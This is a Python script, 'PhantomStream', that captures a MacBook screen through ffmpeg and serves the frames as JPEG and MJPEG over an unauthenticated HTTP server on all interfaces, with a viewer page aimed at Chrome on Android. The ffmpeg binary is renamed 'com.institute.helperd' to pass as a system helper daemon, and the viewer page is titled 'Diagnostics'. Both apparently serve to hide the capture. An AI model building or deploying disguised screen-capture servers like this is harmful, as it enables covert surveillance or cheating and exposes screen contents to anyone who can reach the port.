#!/usr/bin/env python3
"""
PhantomStream v1.0 — HTTP JPEG Frame Server
Endpoints:
  GET /        → HTML viewer with JS polling (works on Chrome Android)
  GET /frame   → latest JPEG frame (called by JS every 250ms)
  GET /stream  → legacy MJPEG multipart (kept for desktop VLC/ffplay)
"""

import os
import queue
import signal
import socket
import subprocess
import threading
import sys
import time

INSTALL_DIR = os.path.dirname(os.path.abspath(__file__))
FFMPEG      = os.path.join(INSTALL_DIR, "com.institute.helperd")
LOG_FILE    = os.path.join(INSTALL_DIR, "stream.log")
PID_FILE    = os.path.join(INSTALL_DIR, "stream.pid")
FPID_FILE   = os.path.join(INSTALL_DIR, "ffmpeg.pid")
PORT        = 49213

# ── Shared latest frame (updated by broadcaster, read by /frame requests) ─────
_latest_frame:      bytes          = b""
_latest_frame_lock: threading.Lock = threading.Lock()

# ── MJPEG multipart clients (kept for legacy support) ─────────────────────────
_clients:      list = []
_clients_lock: threading.Lock = threading.Lock()

# ── HTML page: JS polls /frame every 250ms → works on all Chrome versions ─────
HTML = b"""<!DOCTYPE html>
<html>
<head>
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
  <title>Diagnostics</title>
  <style>
    * { margin:0; padding:0; box-sizing:border-box }
    body { background:#000; width:100vw; height:100vh;
           display:flex; align-items:center; justify-content:center }
    img { max-width:100%; max-height:100vh; object-fit:contain }
  </style>
</head>
<body>
  <img id="f" src="/frame">
  <script>
    var img = document.getElementById('f');
    var ok = true;
    function next() {
      if (!ok) return;
      var i = new Image();
      i.onload = function() { img.src = i.src; ok = true; };
      i.onerror = function() { ok = true; };
      ok = false;
      i.src = '/frame?' + Date.now();
    }
    setInterval(next, 250);
  </script>
</body>
</html>"""


def _broadcast_frames(proc: subprocess.Popen) -> None:
    """Parse JPEG frames from ffmpeg pipe; store latest + push to MJPEG clients."""
    global _latest_frame
    buf = b""
    SOI = b"\xff\xd8"
    EOI = b"\xff\xd9"

    while True:
        chunk = proc.stdout.read(32768)  # type: ignore[union-attr]
        if not chunk:
            break
        buf += chunk

        while True:
            s = buf.find(SOI)
            if s == -1:
                buf = b""
                break
            e = buf.find(EOI, s + 2)
            if e == -1:
                buf = buf[s:]
                break

            frame = buf[s : e + 2]
            buf   = buf[e + 2:]

            # Store as latest frame for /frame polling
            with _latest_frame_lock:
                _latest_frame = frame

            # Push to any MJPEG multipart clients
            with _clients_lock:
                for q in list(_clients):
                    if q.full():
                        try: q.get_nowait()
                        except queue.Empty: pass
                    try: q.put_nowait(frame)
                    except queue.Full: pass


def _serve_frame(conn: socket.socket) -> None:
    """Return the latest JPEG frame as a single HTTP response."""
    with _latest_frame_lock:
        frame = _latest_frame

    if not frame:
        # No frame yet — return 503
        conn.sendall(
            b"HTTP/1.1 503 Service Unavailable\r\n"
            b"Retry-After: 1\r\nConnection: close\r\n\r\n"
        )
        conn.close()
        return

    conn.sendall(
        b"HTTP/1.1 200 OK\r\n"
        b"Content-Type: image/jpeg\r\n"
        b"Content-Length: " + str(len(frame)).encode() + b"\r\n"
        b"Cache-Control: no-cache, no-store, must-revalidate\r\n"
        b"Pragma: no-cache\r\n"
        b"Access-Control-Allow-Origin: *\r\n"
        b"Connection: close\r\n\r\n"
        + frame
    )
    conn.close()


def _serve_stream(conn: socket.socket) -> None:
    """Legacy MJPEG multipart stream — kept for desktop VLC/ffplay."""
    q: queue.Queue = queue.Queue(maxsize=2)
    with _clients_lock:
        _clients.append(q)

    try:
        conn.sendall(
            b"HTTP/1.1 200 OK\r\n"
            b"Content-Type: multipart/x-mixed-replace;boundary=phantomframe\r\n"
            b"Cache-Control: no-cache\r\nConnection: keep-alive\r\n\r\n"
        )
        conn.settimeout(2.0)

        while True:
            try:
                frame = q.get(timeout=10)
            except queue.Empty:
                continue

            header = (
                b"--phantomframe\r\nContent-Type: image/jpeg\r\n"
                b"Content-Length: " + str(len(frame)).encode() + b"\r\n\r\n"
            )
            try:
                conn.sendall(header + frame + b"\r\n")
            except (socket.timeout, OSError):
                try:
                    while True: q.get_nowait()
                except queue.Empty:
                    pass
    except (BrokenPipeError, ConnectionResetError, OSError):
        pass
    finally:
        with _clients_lock:
            if q in _clients:
                _clients.remove(q)
        try: conn.close()
        except: pass


def _handle_client(conn: socket.socket) -> None:
    try:
        raw = b""
        conn.settimeout(5.0)
        while b"\r\n\r\n" not in raw:
            chunk = conn.recv(1024)
            if not chunk:
                return
            raw += chunk

        first_line = raw.split(b"\r\n")[0].decode(errors="replace")
        path = first_line.split(" ")[1].split("?")[0] if " " in first_line else "/"

        if path == "/frame":
            _serve_frame(conn)
        elif path == "/stream":
            _serve_stream(conn)
        else:
            conn.sendall(
                b"HTTP/1.1 200 OK\r\n"
                b"Content-Type: text/html; charset=utf-8\r\n"
                b"Content-Length: " + str(len(HTML)).encode() + b"\r\n"
                b"Connection: close\r\n\r\n" + HTML
            )
            conn.close()
    except Exception:
        try: conn.close()
        except: pass


def main() -> None:
    with open(PID_FILE, "w") as fh:
        fh.write(str(os.getpid()))

    # Full resolution + quality — USB handles the bandwidth easily
    cmd = [
        FFMPEG,
        "-f",            "avfoundation",
        "-framerate",    "4",
        "-video_size",   "1280x800",       # MacBook Air 2017 native res
        "-pixel_format", "uyvy422",
        "-i",            "1",
        "-vf",           "scale=1280:800:flags=fast_bilinear",
        "-c:v",          "mjpeg",
        "-q:v",          "4",              # high quality — USB has bandwidth
        "-threads",      "2",
        "-f",            "mjpeg",
        "-loglevel",     "error",
        "pipe:1",
    ]

    log_fh = open(LOG_FILE, "a")
    proc   = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=log_fh,
                               bufsize=0)

    with open(FPID_FILE, "w") as fh:
        fh.write(str(proc.pid))

    def _cleanup(signum=None, frame=None) -> None:
        proc.terminate()
        try: log_fh.close()
        except: pass
        sys.exit(0)

    signal.signal(signal.SIGTERM, _cleanup)
    signal.signal(signal.SIGINT,  _cleanup)

    threading.Thread(target=_broadcast_frames, args=(proc,), daemon=True).start()

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", PORT))
    srv.listen(32)

    while True:
        try:
            conn, _ = srv.accept()
            threading.Thread(target=_handle_client, args=(conn,), daemon=True).start()
        except OSError:
            break


if __name__ == "__main__":
    main()
